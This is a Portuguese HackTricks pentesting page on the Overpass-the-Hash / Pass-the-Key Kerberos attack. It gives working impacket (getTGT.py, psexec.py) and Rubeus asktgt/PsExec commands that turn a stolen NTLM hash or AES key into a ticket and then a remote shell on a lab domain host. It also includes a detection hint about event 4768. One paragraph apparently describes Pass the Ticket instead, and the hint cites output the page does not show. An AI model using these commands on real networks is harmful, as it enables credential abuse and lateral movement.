## Overpass The Hash/Pass The Key (PTK)

Este ataque tem como objetivo **usar o hash NTLM do usuário ou as chaves AES para solicitar tickets Kerberos**, como uma alternativa ao comum Pass The Hash sobre o protocolo NTLM. Portanto, isso pode ser especialmente **útil em redes onde o protocolo NTLM está desativado** e apenas **o Kerberos é permitido** como protocolo de autenticação.

Para realizar este ataque, é necessário o **hash NTLM (ou senha) da conta de usuário alvo**. Assim, uma vez obtido o hash do usuário, um TGT pode ser solicitado para essa conta. Finalmente, é possível **acessar** qualquer serviço ou máquina **onde a conta de usuário tem permissões**.
```
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Você pode **especificar** `-aesKey [chave AES]` para usar **AES256**.\
Você também pode usar o ticket com outras ferramentas como: smbexec.py ou wmiexec.py

Possíveis problemas:

* _PyAsn1Error(‘NamedTypes can cast only scalar values’,)_ : Resolvido atualizando o impacket para a versão mais recente.
* _KDC can’t found the name_ : Resolvido usando o nome do host em vez do endereço IP, pois ele não foi reconhecido pelo Kerberos KDC.
```
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Esse tipo de ataque é semelhante ao **Pass the Key**, mas em vez de usar hashes para solicitar um ticket, o próprio ticket é roubado e usado para autenticar como seu proprietário.

{% hint style="warning" %}
Quando um TGT é solicitado, o evento `4768: A Kerberos authentication ticket (TGT) was requested` é gerado. Você pode ver a partir da saída acima que o KeyType é **RC4-HMAC** (0x17), mas o tipo padrão para o Windows agora é **AES256** (0x12).
{% endhint %}
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Referências

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
